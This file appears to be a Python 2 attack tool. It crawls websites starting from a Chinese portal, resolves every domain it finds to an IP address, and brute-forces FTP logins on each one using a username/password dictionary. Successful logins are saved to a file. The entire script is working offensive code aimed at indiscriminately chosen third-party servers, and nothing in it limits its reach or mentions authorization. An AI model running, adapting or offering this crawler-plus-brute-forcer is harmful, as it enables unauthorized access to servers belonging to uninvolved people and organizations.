#!/usr/bin/env python
import ftplib
import re
import socket
import urllib2
import gevent
from gevent import monkey
from gevent import queue
monkey.patch_all()


passwdFile = 'userpass.txt'
hosts = queue.Queue()
hostpool=queue.Queue()
hostset=set()
hostset1=set()
hostpool.put("http://www.hao123.com/")
hostset1.add("http://www.hao123.com/")
def bruteLogin(dic):
    while True:
        if hosts.empty():
#            print 'hosts empty'
            gevent.sleep(0)
            continue
        hostname=hosts.get()
        print hostname
        
        for userName in dic.keys():
            passWord=dic[userName]
            print "[+] Trying: "+userName+"/"+passWord
            try:
                with gevent.Timeout(2, False) as timeout:
                    ftp = ftplib.FTP(hostname)
                    ftp.login(userName, passWord)
                    print '\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord
                    succ=open('succ.txt','w+')
                    succ.write('\n[*] ' + str(hostname) +' FTP Logon Succeeded: '+userName+"/"+passWord)
                    succ.close()
                    ftp.quit()
            except Exception, e:
                pass
            print 'login {0} wrong.'.format(hostname)

        
def scanhost():
    while True:
        if hostpool.empty():
            print 'no host'
        host=hostpool.get()
        #connect to a URL
        print host
        try:
            with gevent.Timeout(2, False) as timeout:
                website = urllib2.urlopen(host)
        except TypeError,e:
            print 'urlopen:'+host+str(e)

        #read html code
        html = website.read()
        #use re.findall to get all the links
        links = re.findall('"((http|ftp)?://(.*?(\.net|\.com|\.cn|\.org|\.cc|\.tv|\.tk|\.me)).*?)"', html,re.I)

        for link in links:
            if link[0] not in hostset1:
                hostpool.put(link[0])
                hostset1.add(link[0])

            if link[2] not in hostset:
                try: 
                    ip = socket.gethostbyname(link[2]) 
                except Exception,e:
                    print 'gethost:'+link[2]+str(e)
                hosts.put(ip)
                hostset.add(link[2])
pF = open(passwdFile, 'r')
dic={}
for line in pF.readlines():
    userName=line.split(':')[0]
    passWord=line.split(':')[1].strip('\r').strip('\n')
    dic[userName]=passWord
bure=gevent.spawn(bruteLogin,dic)
scan=gevent.spawn(scanhost)
gevent.joinall((scan,bure))
